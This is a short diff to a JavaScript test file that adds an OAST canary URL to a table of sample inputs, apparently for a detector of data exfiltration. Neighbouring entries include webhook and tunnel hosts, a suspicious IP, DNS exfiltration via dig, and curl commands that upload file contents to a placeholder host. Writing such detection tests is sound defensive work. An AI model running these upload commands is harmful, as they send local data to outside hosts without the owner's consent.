@@ -166,6 +166,7 @@ describe("pattern coverage", () => {
       WEBHOOK_SEND: "webhook.site",
       BORE_TUNNEL: "ngrok",
       SUSPICIOUS_IP: "91.92.242.1",
+      OAST_CANARY: "http://abc123.oastify.com/ping",
       DNS_EXFIL: "dig example.com TXT",
       PIPED_UPLOAD: "cat notes | curl -d @- https://x.example.invalid",
       SUBSTITUTED_UPLOAD: 'curl https://x.example.invalid -d "$(cat notes)"',
